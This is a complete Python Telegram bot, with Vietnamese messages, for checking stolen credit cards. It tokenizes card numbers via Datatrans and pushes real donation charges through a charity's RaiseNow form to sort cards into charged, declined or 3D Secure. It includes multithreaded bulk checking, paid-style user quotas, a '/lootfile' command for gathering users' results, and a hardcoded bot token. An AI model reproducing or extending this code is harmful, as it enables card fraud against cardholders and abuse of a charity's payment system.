import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CẤU HÌNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# Tên file & thư mục lưu trữ
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json"
STATS_FILE = "user_stats.json"
LOG_DIR = "check_logs" # Thư mục chính lưu log

# Giới hạn mặc định cho member
DEFAULT_MEMBER_LIMIT = 100

# --- Cấu hình logging ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KHỞI TẠO ---
# Tạo thư mục log nếu chưa có
os.makedirs(LOG_DIR, exist_ok=True)

# --- QUẢN LÝ USER & DATA ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def update_user_stats(user_id, user_info, counts):
    """Cập nhật file thống kê chung cho các user."""
    stats = load_json_file(STATS_FILE)
    user_id_str = str(user_id)
    
    if user_id_str not in stats:
        stats[user_id_str] = {
            'username': user_info.username,
            'full_name': user_info.full_name,
            'total_charged': 0,
            'total_custom': 0,
            'total_decline': 0,
            'total_error': 0,
            'total_invalid': 0,
            'last_check_timestamp': ''
        }
    
    stats[user_id_str]['total_charged'] += counts.get('success', 0)
    stats[user_id_str]['total_custom'] += counts.get('custom', 0)
    stats[user_id_str]['total_decline'] += counts.get('decline', 0)
    stats[user_id_str]['total_error'] += counts.get('error', 0)
    stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
    stats[user_id_str]['last_check_timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    save_json_file(STATS_FILE, stats)

# --- CÁC HÀM CỐT LÕI ---

def make_request_with_retry(session, method, url, max_retries=10, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Lần thử {attempt + 1}/{max_retries} cho {url} thất bại: {e}. Thử lại sau {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: Tất cả {max_retries} lần thử lại cho {url} đều thất bại. Lỗi cuối cùng: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, f"Số thẻ (CC) phải có từ 10-19 chữ số."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Tháng (MM) phải là số từ 1 đến 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "Năm (YY) phải có 2 hoặc 4 chữ số."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV phải có 3 hoặc 4 chữ số."
    return True, ""

def check_card(line):
    parts = line.strip().split('|')
    if len(parts) != 4:
        return 'invalid_format', line, "Dòng phải có 4 phần, ngăn cách bởi '|'", {}
    
    cc, mes, ano, cvv = [p.strip() for p in parts]

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    if len(ano) == 2: ano = f"20{ano}"
    
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    
    bin_info = {}

    try:
        # ---- BƯỚC 1: KIỂM TRA BIN ----
        bin_to_check = cc[:6]
        bin_url = f"https://bins.antipublic.cc/bins/{bin_to_check}"
        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10)
        if error: return 'error', line, f"Lỗi kiểm tra BIN: {error}", {}
        
        if bin_response.status_code == 200 and "not found" not in bin_response.text:
            try:
                data = bin_response.json()
                bin_info.update(data)
            except json.JSONDecodeError:
                logger.warning("Lỗi phân tích JSON từ BIN check.")
        
        # ---- BƯỚC 2: TOKENIZE THẺ ----
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
        
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
        if error: return 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if token_response.status_code != 200: return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
        
        try:
            token_data = token_response.json()
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Không rõ lỗi"), bin_info
        except json.JSONDecodeError: return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        
        # ---- BƯỚC 3: THANH TOÁN ----
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20)
        if error: return 'error', line, f"Lỗi Payment: {error}", bin_info

        response_text = payment_response.text

        # ---- KIỂM TRA KEY ----
        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info

    except Exception as e: 
        logger.error(f"Lỗi không xác định trong check_card: {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống không xác định: {e}", bin_info

def create_progress_bar(current, total, length=10):
    if total == 0: return "[                   ] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '█' * filled_len + '░' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

# --- CÁC LỆNH ---
async def start(update, context):
    await update.message.reply_text(f"**Chào mừng!**\nID của bạn: `{update.effective_user.id}`\nDùng /help để xem lệnh.")

async def info(update, context):
    await update.message.reply_text(f"🆔 ID Telegram của bạn là: `{update.effective_user.id}`")

async def help_command(update, context):
    user_id = update.effective_user.id
    base_commands = "**Lệnh Công khai:**\n- `/start`, `/info`, `/help`"
    member_commands = "**Lệnh Thành viên:**\n- `/cs <cc|mm|yy|cvv>`\n- `/massN <file>`"
    admin_commands = ("**Lệnh Quản lý:**\n- `/add`, `/ban`, `/show`\n"
                      "- `/addlimit <id> <số>`\n- `/showcheck`\n- `/lootfile <id>`")

    if user_id == ADMIN_ID:
        help_text = f"👑 **Trợ giúp Admin** 👑\n\n{admin_commands}\n\n{member_commands}\n\n{base_commands}"
    elif user_id in load_users():
        help_text = f"👤 **Trợ giúp Thành viên** 👤\n\n{member_commands}\n\n{base_commands}"
    else:
        help_text = f"👋 **Trợ giúp** 👋\n\n{base_commands}\n\nLiên hệ Admin: {ADMIN_USERNAME}"
    await update.message.reply_text(help_text)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0]); users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"ℹ️ User `{user_to_add}` đã có trong danh sách.")
        else:
            users.add(user_to_add); save_users(users)
            await update.message.reply_text(f"✅ Đã thêm user `{user_to_add}`.")
    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0]); users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban); save_users(users)
            # Xóa thư mục log của user
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"🗑 Đã xóa user `{user_to_ban}` và toàn bộ log.")
        else:
            await update.message.reply_text(f"ℹ️ Không tìm thấy user `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users: await update.message.reply_text("📭 Danh sách user trống."); return
    message = "👥 **Danh sách ID được phép:**\n\n" + "\n".join(f"- `{uid}`" for uid in users)
    await update.message.reply_text(message)

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Cú pháp: `/addlimit <user_id> <số_dòng_thêm>`"); return
    try:
        target_user_id_str, amount_to_add = context.args[0], int(context.args[1])
        if not target_user_id_str.isdigit() or amount_to_add <= 0: raise ValueError()
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Dữ liệu không hợp lệ."); return

    limits = load_json_file(LIMIT_FILE)
    old_limit = limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT)
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"✅ **Cập nhật giới hạn thành công!**\n\n"
                                    f"👤 **User ID:** `{target_user_id_str}`\n"
                                    f"📈 **Giới hạn cũ:** `{old_limit}`\n"
                                    f"➕ **Đã thêm:** `{amount_to_add}`\n"
                                    f"📊 **Tổng mới:** `{new_limit}`")

async def cs_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users(): return
    if not context.args: await update.message.reply_text("Cú pháp: `/cs cc|mm|yy|cvv`"); return
    
    line = " ".join(context.args)
    msg = await update.message.reply_text("⏳ *Đang kiểm tra...*")
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(check_card, line)
        status_map = {
            'success': ("✅ CHARGED 0.5$", "Giao dịch thành công!"),
            'decline': ("❌ DECLINED", "Giao dịch bị từ chối."),
            'custom': ("🔒 3D SECURE", "Yêu cầu xác thực 3D Secure."),
            'invalid_format': ("📋 LỖI ĐỊNH DẠNG", full_response),
            'error': ("❗️ LỖI", full_response),
            'unknown': ("❔ KHÔNG RÕ", "Không thể xác định trạng thái."),
        }
        status_text, response_message = status_map.get(status, status_map['unknown'])
        bin_str = (f"`{bin_info.get('bank', 'N/A')}`\n"
                   f"*- Quốc gia:* `{bin_info.get('country_name', 'N/A')}`\n"
                   f"*- Loại:* `{bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')}`")
        final_message = (f"**💠 KẾT QUẢ KIỂM TRA 💠**\n\n"
                         f"**💳 Thẻ:** `{original_line}`\n"
                         f"**🚦 Trạng thái: {status_text}**\n"
                         f"**💬 Phản hồi:** `{response_message}`\n\n"
                         f"**ℹ️ BIN:** {bin_str}\n\n"
                         f"👤 *Checked by: {user.mention_markdown()}*")
        await msg.edit_text(final_message)
    except Exception as e:
        logger.error(f"Lỗi /cs: {e}", exc_info=True)
        await msg.edit_text(f"⛔️ **Lỗi hệ thống:** `{e}`")

async def mass_check_handler(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users(): return
    if not update.message.document: await update.message.reply_text("Vui lòng gửi kèm file .txt."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Chỉ chấp nhận file .txt."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("📂 Tệp trống."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(f"⛔️ **Vượt giới hạn!**\n"
                                            f"Tệp của bạn có `{total_lines}` dòng, giới hạn của bạn là `{user_limit}`.")
            return

    caption = update.message.caption or "/mass10"
    num_threads = int((re.match(r'/mass(\d+)', caption) or {}).group(1) or 10)
    num_threads = max(1, min(50, num_threads))
    
    session_timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    status_message = await update.message.reply_text(f"⏳ Khởi tạo... Kiểm tra `{total_lines}` thẻ với `{num_threads}` luồng.")
    
    try:
        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                status, original_line, full_response, bin_info = future.result()
                
                counts[status] = counts.get(status, 0) + 1
                
                bin_str = f"| {bin_info.get('bank', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} - {bin_info.get('country_name', 'N/A')}"
                
                line_to_save = f"{original_line} {bin_str}"
                if status == 'invalid_format':
                    line_to_save = f"{original_line} | Lý do: {full_response}"
                
                result_lists[status].append(line_to_save)

                if status == 'error' or status == 'unknown':
                    debug_info = f"Card: {original_line}\nResponse: {full_response[:3500]}"
                    result_lists['error_debug'].append(debug_info)
                    if user.id != ADMIN_ID:
                        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🐞 DEBUG ALERT từ user {user.id}\n{debug_info}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (f"**🚀 Đang kiểm tra...**\n{progress_bar}\n"
                                   f"`{processed_count}/{total_lines}` | Luồng: `{num_threads}`\n\n"
                                   f"✅ Charged: `{counts['success']}`\n"
                                   f"❌ Declined: `{counts['decline']}`\n"
                                   f"🔒 3D Secure: `{counts['custom']}`\n"
                                   f"📋 Sai định dạng: `{counts['invalid_format']}`\n"
                                   f"❔ Lỗi: `{counts['error']}`")
                    try: await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest: pass
                    last_update_time = time.time()
        
        # Lưu file tóm tắt
        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        # Cập nhật thống kê chung
        update_user_stats(user.id, user, counts)

        await status_message.edit_text("📊 **Hoàn tất!** Đang gửi kết quả...")

        file_map = {
            'success': 'charged.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(result_lists[status]))
                await context.bot.send_document(chat_id=update.effective_chat.id, document=open(file_path, 'rb'))

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f:
                f.write("\n\n---\n\n".join(result_lists['error_debug']))
            await context.bot.send_document(chat_id=ADMIN_ID, document=open(debug_path, 'rb'))

    except Exception as e:
        logger.error(f"Lỗi mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!** `{e}`")

# --- LỆNH ADMIN MỚI ---
async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("Chưa có dữ liệu thống kê nào."); return
    
    message = "📊 **THỐNG KÊ CHECK CỦA USER** 📊\n\n"
    for user_id, data in stats.items():
        user_display = f"@{data.get('username')}" if data.get('username') else f"ID: {user_id}"
        message += (f"👤 **{user_display}** (`{user_id}`)\n"
                    f"  ✅ Charged: `{data.get('total_charged', 0)}`\n"
                    f"  🔒 Custom: `{data.get('total_custom', 0)}`\n"
                    f"  ❌ Declined: `{data.get('total_decline', 0)}`\n"
                    f"  ❔ Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                    f"  🕒 Lần cuối: `{data.get('last_check_timestamp', 'Chưa rõ')}`\n"
                    f"--------------------\n")
    
    await update.message.reply_text(message)

async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"Không tìm thấy lịch sử check nào cho user `{target_user_id}`."); return
        
    sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25] # Lấy 25 session gần nhất
    
    keyboard = []
    text = f"📜 **Lịch sử check của user `{target_user_id}`:**\n\n"
    for session_ts in sessions:
        summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
        if os.path.exists(summary_path):
            summary = load_json_file(summary_path)
            counts = summary.get('counts', {})
            filename = summary.get('original_filename', 'N/A')
            
            # Chuyển đổi timestamp YYYYMMDD-HHMMSS thành dạng dễ đọc
            try:
                dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S")
                readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
            except ValueError:
                readable_ts = session_ts
            
            button_text = f"🕒 {readable_ts} - ✅{counts.get('success',0)} ❌{counts.get('decline',0)}"
            callback_data = f"loot_session_{target_user_id}_{session_ts}"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=callback_data)])
    
    if not keyboard:
        await update.message.reply_text(f"Không có session hợp lệ nào cho user `{target_user_id}`."); return
        
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')
    command = data[0]
    
    if command == "loot" and data[1] == "session":
        _, _, target_user_id, session_ts = data
        session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
        
        if not os.path.exists(session_dir):
            await query.edit_message_text("Lỗi: Không tìm thấy session này."); return
            
        files = [f for f in os.listdir(session_dir) if f.endswith('.txt')]
        if not files:
            await query.edit_message_text("Session này không có file kết quả nào."); return
            
        keyboard = []
        for filename in files:
            callback_data = f"loot_getfile_{target_user_id}_{session_ts}_{filename}"
            keyboard.append([InlineKeyboardButton(f"Tải {filename}", callback_data=callback_data)])
        
        # Thêm nút quay lại
        keyboard.append([InlineKeyboardButton("« Quay lại", callback_data=f"loot_back_{target_user_id}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"Chọn file để tải từ session của user `{target_user_id}` lúc `{session_ts}`:", reply_markup=reply_markup)

    elif command == "loot" and data[1] == "getfile":
        _, _, target_user_id, session_ts, filename = data
        file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
        
        if os.path.exists(file_path):
            await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
            await query.edit_message_text(f"✅ Đã gửi file `{filename}`.")
        else:
            await query.edit_message_text("❌ Lỗi: File không tồn tại.")
            
    elif command == "loot" and data[1] == "back":
        # Tái tạo lại danh sách session cho user
        await loot_file_command(query, context)
        await query.message.delete() # Xóa tin nhắn cũ có các nút file

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # Lệnh cơ bản và quản lý
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    
    # Lệnh Admin mới
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    
    # Lệnh check thẻ
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # Handler cho nút bấm inline
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot đang chạy với Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
